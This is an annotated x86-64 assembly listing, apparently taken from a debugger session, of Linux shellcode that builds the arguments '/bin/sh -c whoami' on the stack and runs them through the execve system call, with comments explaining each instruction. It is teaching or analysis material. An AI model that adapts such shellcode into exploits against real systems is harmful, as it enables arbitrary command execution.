; move 59 into rax
push   0x3b
pop    rax
cdq
; move /bin/sh to the stack
movabs rbx,0x68732f6e69622f
push   rbx
; move address of /bin/sh to rdi
mov    rdi,rsp
; move "-c" to stack
push   0x632d
; move address of -c to rsi
mov    rsi,rsp
push   rdx
; jump to second part of shellcode
; also places the string 'whoami' on the stack
call   0x555555558067 <code+39>
** JUMP **
; push address of "-c" to stack
push rsi
; push address of "/bin/sh" to stack
push rdi
; move address of ["/bin/sh", "-c", "whoami"] to rsi
mov rsi, rsp
; executes systemcall: execve("/bin/sh");
syscall
